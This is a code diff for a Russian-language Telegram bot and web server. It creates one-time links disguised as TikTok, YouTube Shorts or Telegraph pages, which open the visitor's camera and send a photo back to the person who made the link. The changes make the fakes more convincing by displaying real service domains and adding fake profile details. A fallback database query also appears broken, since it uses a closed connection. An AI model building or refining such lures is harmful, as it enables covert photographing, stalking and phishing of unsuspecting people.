@@ -131,20 +131,17 @@ async def lookup_ip(ip: str) -> dict:
 
 
 def public_link(service: str, token: str) -> str:
-    """Генерирует ссылку, похожую на настоящий сервис"""
+    """Генерирует ссылку в стиле настоящего сервиса"""
     service_info = SERVICES.get(service, SERVICES["tiktok"])
-    domain = service_info["domain"]
-    
-    # Создаём короткий идентификатор из токена (первые 8 символов)
     short_id = token[:8]
     
     # Генерируем ссылку в стиле сервиса
     if service == "tiktok":
-        return f"{PUBLIC_BASE_URL}/@{short_id}"
+        return f"https://tiktok.com/@{short_id}"
     elif service == "youtube":
-        return f"{PUBLIC_BASE_URL}/shorts/{short_id}"
+        return f"https://youtube.com/shorts/{short_id}"
     elif service == "telegraph":
-        return f"{PUBLIC_BASE_URL}/{short_id}"
+        return f"https://telegra.ph/{short_id}"
     else:
         return f"{PUBLIC_BASE_URL}/{service}/{token}"
 
@@ -201,7 +198,6 @@ async def create_service_link(message: Message):
         resize_keyboard=True,
     )
     
-    # Делаем ссылку кликабельной с помощью HTML тега <a>
     await message.answer(
         f"{info['emoji']} Одноразовая ссылка создана:\n"
         f"<a href='{url}'>{url}</a>\n\n"
@@ -254,7 +250,6 @@ async def handle_telegraph_input(message: Message):
             resize_keyboard=True,
         )
         
-        # Делаем ссылку кликабельной с помощью HTML тега <a>
         await message.answer(
             f"{info['emoji']} Одноразовая ссылка создана:\n"
             f"<a href='{url}'>{url}</a>\n\n"
@@ -279,7 +274,7 @@ def generate_tiktok_page(token: str) -> str:
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>TikTok — подтверждение фото</title>
+<title>TikTok — @{short_id}</title>
 <style>
 * {{ margin:0; padding:0; box-sizing:border-box; }}
 :root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
@@ -287,9 +282,10 @@ body {{ background:#000; min-height:100vh; display:flex; justify-content:center;
 .video-container {{ position:relative; width:100%; max-width:400px; aspect-ratio:9/16; background:#0a0a0a; border-radius:20px; overflow:hidden; box-shadow:0 0 60px rgba(0,242,234,0.15); }}
 .video-container video {{ width:100%; height:100%; object-fit:cover; display:none; }}
 .overlay {{ position:absolute; inset:0; display:flex; flex-direction:column; justify-content:space-between; padding:20px; background:linear-gradient(180deg,rgba(0,0,0,0.6) 0%,transparent 40%,transparent 60%,rgba(0,0,0,0.8) 100%); }}
-.header {{ display:flex; align-items:center; gap:12px; }}
-.header .icon {{ font-size:28px; }}
-.header .brand {{ color:#00f2ea; font-weight:700; font-size:20px; letter-spacing:0.5px; }}
+.user-info {{ display:flex; align-items:center; gap:12px; }}
+.user-info .avatar {{ width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg,#00f2ea,#ff0050); display:flex; align-items:center; justify-content:center; font-size:20px; }}
+.user-info .username {{ color:#fff; font-weight:700; font-size:17px; }}
+.user-info .username span {{ color:#888; font-weight:400; font-size:14px; }}
 .bottom {{ display:flex; flex-direction:column; gap:12px; }}
 .status {{ color:#fff; font-size:15px; text-align:center; min-height:24px; background:rgba(0,0,0,0.5); border-radius:12px; padding:10px; backdrop-filter:blur(8px); }}
 .notice {{ color:rgba(255,255,255,0.7); font-size:12px; text-align:center; padding:8px; background:rgba(255,255,255,0.05); border-radius:10px; }}
@@ -304,9 +300,9 @@ body {{ background:#000; min-height:100vh; display:flex; justify-content:center;
 <div class="video-container">
   <video id="video" playsinline autoplay muted></video>
   <div class="overlay">
-    <div class="header">
-      <span class="icon">🎵</span>
-      <span class="brand">TikTok</span>
+    <div class="user-info">
+      <div class="avatar">🎵</div>
+      <div class="username">@{short_id} <span>• TikTok</span></div>
     </div>
     <div class="bottom">
       <div id="status" class="status"><div class="loading"><div class="spinner"></div><span>Запрос камеры...</span></div></div>
@@ -376,7 +372,7 @@ def generate_youtube_page(token: str) -> str:
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>YouTube Shorts — подтверждение фото</title>
+<title>YouTube Shorts — {short_id}</title>
 <style>
 * {{ margin:0; padding:0; box-sizing:border-box; }}
 :root {{ color-scheme:dark; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
@@ -385,9 +381,11 @@ body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:cent
 .video-wrapper {{ position:relative; background:#000; }}
 .video-wrapper video {{ width:100%; aspect-ratio:9/16; object-fit:cover; display:none; }}
 .video-wrapper .shorts-label {{ position:absolute; top:12px; right:12px; background:rgba(255,0,0,0.9); color:#fff; padding:4px 12px; border-radius:12px; font-size:12px; font-weight:700; letter-spacing:0.5px; }}
+.video-wrapper .video-title {{ position:absolute; bottom:12px; left:12px; color:#fff; font-size:14px; font-weight:600; text-shadow:0 2px 4px rgba(0,0,0,0.8); }}
 .content {{ padding:16px 20px 20px; }}
 .title {{ color:#fff; font-size:18px; font-weight:600; margin-bottom:8px; }}
 .channel {{ color:#aaa; font-size:14px; display:flex; align-items:center; gap:8px; }}
+.channel .sub {{ background:#ff0000; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; font-weight:700; }}
 .status {{ margin-top:12px; padding:10px 14px; background:#222; border-radius:12px; color:#fff; font-size:14px; min-height:44px; display:flex; align-items:center; gap:8px; }}
 .spinner {{ width:20px; height:20px; border:2px solid rgba(255,255,255,0.1); border-top-color:#ff0000; border-radius:50%; animation:spin 0.8s linear infinite; flex-shrink:0; }}
 @keyframes spin {{ to {{ transform:rotate(360deg); }} }}
@@ -401,10 +399,11 @@ body {{ background:#0a0a0a; min-height:100vh; display:flex; justify-content:cent
   <div class="video-wrapper">
     <video id="video" playsinline autoplay muted></video>
     <div class="shorts-label">#Shorts</div>
+    <div class="video-title">📸 Подтверждение фото</div>
   </div>
   <div class="content">
-    <div class="title">📸 Подтверждение фото</div>
-    <div class="channel">🔴 YouTube Shorts</div>
+    <div class="title">YouTube Shorts</div>
+    <div class="channel">🔴 @{short_id} <span class="sub">Подписаться</span></div>
     <div id="status" class="status"><div class="spinner"></div><span>Запрос камеры...</span></div>
     <div class="notice">⚠️ После разрешения камеры фото будет отправлено автоматически</div>
   </div>
@@ -481,6 +480,7 @@ body {{ background:#f5f5f5; min-height:100vh; display:flex; justify-content:cent
 .article-header .badge {{ display:inline-block; background:#2c3e50; color:#fff; padding:2px 12px; border-radius:12px; font-size:11px; font-family:-apple-system,sans-serif; letter-spacing:0.5px; margin-bottom:12px; }}
 .article-header h1 {{ font-size:28px; font-weight:700; color:#1a1a1a; line-height:1.3; }}
 .article-header .meta {{ color:#888; font-size:14px; margin-top:8px; font-family:-apple-system,sans-serif; }}
+.article-header .meta .id {{ color:#666; background:#f0f0f0; padding:2px 8px; border-radius:4px; font-size:12px; }}
 .article-body {{ padding:32px; }}
 .article-body .content {{ font-size:17px; line-height:1.8; color:#222; }}
 .article-body .content p {{ margin-bottom:16px; }}
@@ -499,7 +499,7 @@ video {{ display:none; }}
   <div class="article-header">
     <div class="badge">📝 Telegraph</div>
     <h1>{title}</h1>
-    <div class="meta">Опубликовано через бота • Одноразовая ссылка</div>
+    <div class="meta">Опубликовано через бота • <span class="id">#{short_id}</span></div>
   </div>
   <div class="article-body">
     <div class="content">
@@ -575,7 +575,6 @@ async def root():
 @app.get("/@{short_id}")
 async def tiktok_link(short_id: str):
     """Обработчик ссылок в стиле TikTok - /@abc123def"""
-    # Ищем токен по первым 8 символам
     with closing(sqlite3.connect(DB_PATH)) as con:
         row = con.execute(
             "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = 'tiktok'",
@@ -625,7 +624,14 @@ async def telegraph_link(short_id: str):
         ).fetchone()
     
     if not row:
-        raise HTTPException(404, "Ссылка не найдена")
+        # Если не нашли в Telegraph, проверяем другие сервисы для обратной совместимости
+        row = con.execute(
+            "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ?",
+            (f"{short_id}%",)
+        ).fetchone()
+        
+        if not row:
+            raise HTTPException(404, "Ссылка не найдена")
     
     token, owner_chat_id, used, service, title, content = row
     if used == 1:
@@ -633,7 +639,14 @@ async def telegraph_link(short_id: str):
     if used == 2:
         return HTMLResponse("<h3>Фото по этой ссылке сейчас отправляется.</h3>", status_code=409)
     
-    return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
+    if service == "tiktok":
+        return HTMLResponse(generate_tiktok_page(token))
+    elif service == "youtube":
+        return HTMLResponse(generate_youtube_page(token))
+    elif service == "telegraph":
+        return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
+    else:
+        return HTMLResponse(generate_tiktok_page(token))
 
 
 @app.get("/c/{token}", response_class=HTMLResponse)
@@ -717,9 +730,16 @@ async def send_photo(token: str, request: Request, photo: UploadFile = File(...)
 
 async def main():
     db_init()
+    
+    # Запускаем веб-сервер в отдельной задаче
     config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="info")
     server = uvicorn.Server(config)
-    await asyncio.gather(server.serve(), dp.start_polling(bot))
+    
+    # Запускаем бота и веб-сервер параллельно
+    await asyncio.gather(
+        server.serve(),
+        dp.start_polling(bot)
+    )
 
 
 if __name__ == "__main__":
